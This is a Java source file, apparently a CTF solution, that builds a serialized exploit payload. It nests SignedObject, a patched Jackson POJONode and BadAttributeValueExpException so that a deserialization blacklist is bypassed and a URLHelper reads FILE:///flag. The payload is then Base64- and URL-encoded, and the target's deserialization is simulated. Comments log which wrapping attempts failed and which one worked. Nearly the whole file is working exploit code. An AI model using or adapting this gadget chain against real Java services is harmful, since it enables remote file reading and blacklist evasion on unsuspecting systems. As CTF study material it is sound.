package com.yancao.ctf.test;

import com.fasterxml.jackson.databind.node.POJONode;
import com.yancao.ctf.Exploit;
import com.yancao.ctf.bean.URLHelper;
import com.yancao.ctf.bean.URLVisiter;
import com.yancao.ctf.util.MyObjectInputStream;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.*;
import java.util.Base64;

public class Test {

    public static void main(String[] args) throws Exception {

        // 前期准备
        URLHelper urlHelper = new URLHelper("FILE:///flag");
        URLVisiter urlVisiter = new URLVisiter();
        urlHelper.visiter = urlVisiter;

        // 第一层包装： SignedObject 包装 URLHelper
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(urlHelper, privateKey, signingEngine);

        // 第二层包装： 删除 pojoNode 的 writeReplace，后 POJONode 包装 SignedObject
        // 切记：先删除，后包装
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
            jsonNode.removeMethod(writeReplace);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(classLoader, null);
        } catch (Exception e) {
        }
        // POJONode 包装 SignedObject
        POJONode pojoNode = new POJONode(signedObject);

        // 第三层包装：
        // 创建空的 BadAttributeValueExpException 对象
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        // 找到这个类
        Class cls = Class.forName("javax.management.BadAttributeValueExpException");
        // 拿到这个类的 val 字段，它是一个私有字段
        Field val = cls.getDeclaredField("val");
        // 将 val 字段设置成可访问的
        val.setAccessible(true);
        // 将我们的恶意类塞进去
        val.set(badAttributeValueExpException, pojoNode);

        // 准备序列化生成 payload
        ByteArrayOutputStream ser = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(ser);
        // Test01: SignedObject 包装 URLHelper
        //  结果： 绕过 MyObjectInputStream 的黑名单检测，但无法完成 URLHelper 的反序列化
        // objectOutputStream.writeObject(signedObject);

        // Test02: POJONode 再次包装 SignedObject
        //  结果： 绕过 MyObjectInputStream 的第一层检测，但在拆解 SignedObject 内的对象准备反序列化时被黑名单命中
        // objectOutputStream.writeObject(pojoNode);

        // Test03: BadAttributeValueExpException 再次包装 POJONode
        objectOutputStream.writeObject(badAttributeValueExpException);

        String payload = Base64.getEncoder().encodeToString(ser.toByteArray());
        // URL 编码转换，最终题目由于 payload 是在 URL 中，所以需要一次 URL 编码转换，但是在这里模拟时，不在 URL 传输，所以注释掉
        payload = URLEncoder.encode(payload, StandardCharsets.UTF_8.toString());
        System.out.println(payload);


        /* 反序列化模拟题目 hack 路由解析 */
        byte[] bytes = Base64.getDecoder().decode(payload.getBytes(StandardCharsets.UTF_8));
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        try {
            MyObjectInputStream myObjectInputStream = new MyObjectInputStream(byteArrayInputStream);
            Object obj = myObjectInputStream.readObject();
            URLHelper o = (URLHelper)obj;
            System.out.println(o);
            System.out.println(o.url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
